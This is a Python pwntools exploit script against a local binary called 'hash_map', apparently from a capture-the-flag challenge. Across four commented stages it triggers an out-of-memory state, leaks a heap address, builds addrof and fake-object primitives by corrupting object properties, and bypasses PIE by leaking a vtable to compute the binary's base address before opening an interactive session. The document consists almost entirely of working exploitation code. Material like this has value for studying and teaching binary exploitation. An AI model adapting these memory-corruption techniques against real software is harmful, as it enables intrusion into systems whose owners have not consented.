from pwn import *
context.log_level = 'info'

elf = ELF('./bin/hash_map')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = elf.process(env={'LD_PRELOAD': libc.path})

def send(data):
    p.recvuntil('Command > '.encode())
    p.sendline(data.encode())
    return p.recvline()[9:-1].decode()


######################################
### Stage 1: Trigger Out-of-Memory ###
######################################

send('create hash_map')

# Trigger OOM
for i in range(0, 0x200):
    send(f'hash_map set {i} {i}')


######################################
### Stage 2: Custom Heap Addr Leak ###
######################################

send('create object_array')  # 0
send('create object_array')  # 1
send('create object')        # 2
send('create object')        # 3
send('create integer_array') # 4

send('object 0 set item 3 2')
send('object 0 set item 4 4')

leak_addr = int(send('hash_map get 1910918072')) # IntegerArray address
base_addr = leak_addr & 0xffffffff00000000
obj_addr = base_addr + 0xa000

print()
log.info(f'base_addr @ {base_addr:#x}')
log.info(f'leak_addr @ {leak_addr:#x}')
log.info(f'obj_addr @ {obj_addr:#x}')
print()


################################
### Stage 3: AddrOf, FakeObj ###
################################

send(f'object 0 set property 0 {leak_addr - 0x30}')
send(f'object 1 set property 1 {0x13371337}')
send(f'object 1 set property 0 {leak_addr}')
send('hash_map delete 762944675')


###########################
### Stage 4: PIE Bypass ###
###########################

obj_vtable_offset = 0x15a90
int_arr_vtable_offset = 0x15ab8

send(f'object 2 set property 3 {0x13371337}')
send(f'object 0 set property 0 {obj_addr + 0x10}')

obj_vtable = int(send('hash_map get 762944675'))
binary_base = obj_vtable - obj_vtable_offset
int_arr_vtable = binary_base + int_arr_vtable_offset

log.info(f'binary_base @ {binary_base:#x}')
log.info(f'Object\'s vtable @ {obj_vtable:#x}')
log.info(f'IntegerArray\'s vtable @ {int_arr_vtable:#x}')
print()

p.interactive()
p.close()
